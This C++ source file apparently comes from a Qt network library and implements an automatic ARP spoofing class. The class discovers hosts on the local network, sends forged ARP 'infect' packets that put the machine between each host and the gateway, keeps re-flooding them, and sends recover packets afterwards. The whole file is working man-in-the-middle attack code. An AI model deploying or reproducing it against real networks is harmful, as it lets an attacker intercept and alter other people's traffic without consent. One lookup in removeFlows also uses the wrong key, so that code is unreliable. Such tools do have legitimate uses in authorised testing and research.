#include "gautoarpspoof.h"

// ----------------------------------------------------------------------------
// GAutoArpSpoof
// ----------------------------------------------------------------------------
GAutoArpSpoof::GAutoArpSpoof(QObject* parent) : GArpSpoof(parent) {
	QObject::connect(this, &GArpSpoof::_preCaptured, &hostMgr_, &GHostMgr::manage, Qt::DirectConnection);

	hostScan_.enabled_ = false;
	hostScan_.pcapDevice_ = this;
}

GAutoArpSpoof::~GAutoArpSpoof() {
	close();
}

bool GAutoArpSpoof::doOpen() {
	if (!enabled_) return true;

	if (!GArpSpoof::doOpen()) return false;

	Q_ASSERT(intf() != nullptr);
	if (intf()->ip() == 0) {
		SET_ERR(GErr::ValueIsZero, "ip is zero");
		return false;
	}

	gwIp_ = intf()->gateway();
	if (gwIp_ == 0) {
		SET_ERR(GErr::ValueIsZero, "gateway is zero");
		return false;
	}

	GAtm::iterator it = atm_.find(gwIp_);
	if (it == atm_.end()) {
		atm_.insert(gwIp_, GMac::nullMac());
		atm_.intfName_ = intf_->name();
		if (!atm_.open()) {
			err = atm_.err;
			atm_.close();
			return false;
		}
		bool res = atm_.wait();
		atm_.close();
		if (!res) {
			SET_ERR(GErr::Fail, QString("can not find mac for %1").arg(QString(gwIp_)));
			return false;
		}
		it = atm_.find(gwIp_);
		Q_ASSERT(it != atm_.end());
	}
	gwMac_ = it.value();

	hostMgr_.pcapDevice_ = this;
	hostMgr_.managables_.insert(this);
	if (!hostMgr_.open()) {
		err = hostMgr_.err;
		return false;
	}

	if (!hostScan_.open()) {
		err = hostScan_.err;
		return false;
	}

	return true;
}

bool GAutoArpSpoof::doClose() {
	if (!enabled_) return true;

	{
		QMutexLocker ml(&floodingThreadMap_);
		for (FloodingThread* thread: floodingThreadMap_) {
			thread->swe_.wakeAll();
		}
	}

	{
		QMutexLocker ml(&recoverThreadMap_);
		for (RecoverThread* thread: recoverThreadMap_) {
			thread->swe_.wakeAll();
		}
	}

	QElapsedTimer timer;
	quint64 start = timer.elapsed();
	while (true) {
		{
			QMutexLocker ml(&floodingThreadMap_);
            int count = floodingThreadMap_.size();
			if (count == 0) break;
			qDebug() << QString("flooding map thread count = %1").arg(count); // gilgil temp 2021.11.05
		}
		QCoreApplication::processEvents();
		QThread::msleep(100);
		quint64 now = timer.elapsed();
		if (now - start > G::Timeout) {
			QMutexLocker ml(&floodingThreadMap_);
            int count = floodingThreadMap_.size();
			qCritical() << QString("flooding map thread count = %1").arg(count);
			break;
		}
	}

	start = timer.elapsed();
	while (true) {
		{
			QMutexLocker ml(&recoverThreadMap_);
            int count = recoverThreadMap_.size();
			if (count == 0) break;
			qDebug() << QString("recover map thread count = %1").arg(count); // gilgil temp 2021.11.05
		}
		QCoreApplication::processEvents();
		QThread::msleep(100);
		quint64 now = timer.elapsed();
		if (now - start > G::Timeout) {
			QMutexLocker ml(&recoverThreadMap_);
            int count = recoverThreadMap_.size();
			qCritical() << QString("recover map thread count =%1").arg(count);
			break;
		}
	}

	bool res = GArpSpoof::doClose();

	hostMgr_.close();
	hostScan_.close();
	qDebug() << "completed"; // gilgil temp 2021.11.13
	return res;
}


void GAutoArpSpoof::hostCreated(GMac mac, GHostMgr::HostValue* hostValue) {
	qDebug() << ""; // gilgil temp 2022.09.26
	GIp ip = hostValue->ip_;
	if (ip == 0 || ip == gwIp_) return;

	GFlow::IpFlowKey ipFlowKey(ip, gwIp_);
	{
		QMutexLocker ml(&flowMap_.m_);
		if (flowMap_.find(ipFlowKey) != flowMap_.end()) return;
	}
	// qDebug() << QString("new host(%1 %2) detected").arg(QString(mac), QString(ip));

	Flow flow(ip, mac, gwIp_, gwMac_);
	flow.makePacket(&flow.infectPacket_, attackMac_, true);
	flow.makePacket(&flow.recoverPacket_, attackMac_, false);

	GFlow::IpFlowKey revIpFlowKey(gwIp_, ip);
	Flow revFlow(gwIp_, gwMac_, ip, mac);
	revFlow.makePacket(&revFlow.infectPacket_, attackMac_, true);
	revFlow.makePacket(&revFlow.recoverPacket_, attackMac_, false);

	{
		QMutexLocker ml(&flowList_.m_);
		flowList_.push_back(flow);
		flowList_.push_back(revFlow);
	}
	{
		QMutexLocker mlForMap(&flowMap_.m_);
		flowMap_.insert(ipFlowKey, flow);
		flowMap_.insert(revIpFlowKey, revFlow);
	}

	sendArpInfect(&flow, GArpHdr::Request);
	QThread::msleep(sendInterval_);
	sendArpInfect(&revFlow, GArpHdr::Request);

	TwoFlowKey twoFlowKey(ipFlowKey, revIpFlowKey);
	if (floodingTimeout_ != 0) {
		QMetaObject::invokeMethod(this, [this, twoFlowKey, flow, revFlow]() {
			FloodingThread* thread = new FloodingThread(this, twoFlowKey, flow.infectPacket_, revFlow.infectPacket_);
			thread->start();
		});
	}

	if (recoverTimeout_ != 0) {
		QMetaObject::invokeMethod(this, [this, twoFlowKey, flow, revFlow]() {
			RecoverThread* thread = new RecoverThread(this, twoFlowKey, flow, revFlow);
			thread->start();
		});
	}
}

void GAutoArpSpoof::hostDeleted(GMac mac, GHostMgr::HostValue* hostValue) {
	qDebug() << ""; // gilgil temp 2022.09.26
	if (active()) {
		GIp ip = hostValue->ip_;
		Flow flow(ip, mac, gwIp_, gwMac_);
		Flow revFlow(gwIp_, gwMac_, ip, mac);
		removeFlows(&flow, &revFlow);
	}
}

void GAutoArpSpoof::hostChanged(GMac mac, GHostMgr::HostValue* hostValue) {
	hostCreated(mac, hostValue);
}

GAutoArpSpoof::FloodingThread::FloodingThread(GAutoArpSpoof* aas, GAutoArpSpoof::TwoFlowKey twoFlowKey, GEthArpPacket infectPacket1, GEthArpPacket infectPacket2) : GThread(aas) {
	GDEBUG_CTOR
	twoFlowKey_ = twoFlowKey;
	infectPacket_[0] = infectPacket1;
	infectPacket_[1] = infectPacket2;
	{
		QMutexLocker ml(&aas->floodingThreadMap_);
		aas->floodingThreadMap_.insert(twoFlowKey, this);
	}
	QObject::connect(this, &QThread::finished, this, &QObject::deleteLater);
}

GAutoArpSpoof::FloodingThread::~FloodingThread() {
	GDEBUG_DTOR
	GAutoArpSpoof* aas = PAutoArpSpoof(parent());
	Q_ASSERT(aas != nullptr);
	{
		QMutexLocker ml(&aas->floodingThreadMap_);
		aas->floodingThreadMap_.remove(twoFlowKey_);
	}
}

void GAutoArpSpoof::FloodingThread::run() {
	qDebug() << QString("beg %1").arg(QString(infectPacket_->arpHdr_.tip())); // gilgil temp 2021.11.15
	GAutoArpSpoof* aas = PAutoArpSpoof(parent());
	Q_ASSERT(aas != nullptr);
	QElapsedTimer timer;
	timer.start();
	while (aas->active()) {
		qint64 elapsed = timer.elapsed();
		if (elapsed > qint64(aas->floodingTimeout_)) break;
		for (int i = 0; i < 2; i++) {
			GBuf buf(pbyte(&infectPacket_[i]), sizeof(GEthArpPacket));
			aas->write(buf);
			if (swe_.wait(aas->sendInterval_)) break;
		}
		if (swe_.wait(aas->floodingSendInterval_)) break;
	}
	qDebug() << QString("end %1").arg(QString(infectPacket_->arpHdr_.tip())); // gilgil temp 2021.11.15
}

GAutoArpSpoof::RecoverThread::RecoverThread(GAutoArpSpoof* autoArpSpoof, GAutoArpSpoof::TwoFlowKey twoFlowKey, Flow flow1, Flow flow2) : GThread(autoArpSpoof) {
	GAutoArpSpoof* aas = autoArpSpoof;
	twoFlowKey_ = twoFlowKey;
	flow1_ = flow1;
	flow2_ = flow2;
	GFlow::IpFlowKey ipFlowKey1{flow1.senderIp_, flow1.targetIp_};
	GFlow::IpFlowKey ipFlowKey2{flow2.senderIp_, flow2.targetIp_};
	{
		QMutexLocker ml(&aas->recoverThreadMap_);
		aas->recoverThreadMap_.insert(twoFlowKey, this);
	}
	QObject::connect(this, &QThread::finished, this, &QObject::deleteLater);
}

GAutoArpSpoof::RecoverThread::~RecoverThread() {
	GAutoArpSpoof* aas = PAutoArpSpoof(parent());
	Q_ASSERT(aas != nullptr);
	{
		QMutexLocker ml(&aas->recoverThreadMap_);
		aas->recoverThreadMap_.remove(twoFlowKey_);

		if (aas->active()) {
			aas->removeFlows(&flow1_, &flow2_);
		}
	}
}

void GAutoArpSpoof::RecoverThread::run() {
	GAutoArpSpoof* aas = PAutoArpSpoof(parent());
	Q_ASSERT(aas != nullptr);
	qDebug() << QString("beg %1").arg(QString(flow1_.senderIp_)); // gilgil temp 2021.11.15
	swe_.wait(aas->recoverTimeout_);
	qDebug() << QString("end %1").arg(QString(flow1_.senderIp_)); // gilgil temp 2021.11.15
}

void GAutoArpSpoof::removeFlows(Flow* flow1, Flow* flow2) {
	sendArpRecover(flow1, GArpHdr::Request);
	QThread::msleep(sendInterval_);
	sendArpRecover(flow2, GArpHdr::Request);

	FlowList flowList;
	flowList.push_back(*flow1);
	flowList.push_back(*flow2);
	runArpRecover(&flowList);

	GFlow::IpFlowKey flow1Key(flow1->senderIp_, flow1->targetIp_);
	GFlow::IpFlowKey flow2Key(flow2->senderIp_, flow2->targetIp_);
	{
		QMutexLocker ml(&flowList_.m_);
		int index = flowList_.findIndex(flow1Key);
		if (index != -1)
			flowList_.removeAt(index);

		index = flowList_.findIndex(flow2Key);
		if (index != -1)
			flowList_.removeAt(index);
	}
	{
		QMutexLocker mlForMap(&flowMap_.m_);
		flowMap_.remove(flow1Key);
		flowMap_.remove(flow2Key);
	}

	TwoFlowKey twoFlowKey(flow1Key, flow2Key);
	{
		QMutexLocker ml(&floodingThreadMap_);
		FloodingThreadMap::iterator it = floodingThreadMap_.find(twoFlowKey);
		if (it != floodingThreadMap_.end()) {
			FloodingThread* floodingThread = it.value();
			floodingThread->swe_.wakeAll();
		}
	}
	{
		QMutexLocker ml(&recoverThreadMap_);
		RecoverThreadMap::iterator it = recoverThreadMap_.find(twoFlowKey);
		if (it != recoverThreadMap_.end()) {
			RecoverThread* recoverThread = it.value();
			recoverThread->swe_.wakeAll();
		}
	}
}

void GAutoArpSpoof::removeFlows(GIp senderIp1, GIp targetIp1, GIp senderIp2, GIp targetIp2) {
	Flow* flow1 = nullptr;
	Flow* flow2 = nullptr;
	{
		QMutexLocker ml(&flowMap_.m_);
		GFlow::IpFlowKey key1(senderIp1, targetIp1);
		FlowMap::iterator it = flowMap_.find(key1);
		if (it == flowMap_.end()) {
			qCritical() << QString("can not find flow1 for %1 %2").arg(QString(senderIp1), QString(targetIp1));
			return;
		}
		flow1 = &it.value();

		GFlow::IpFlowKey key2(senderIp2, targetIp2);
		it = flowMap_.find(key1);
		if (it == flowMap_.end()) {
			qCritical() << QString("can not find flow2 for %1 %2").arg(QString(senderIp1), QString(targetIp1));
			return;
		}
		flow2 = &it.value();
	}
	Q_ASSERT(flow1 != nullptr);
	Q_ASSERT(flow2 != nullptr);
	removeFlows(flow1, flow2);
}
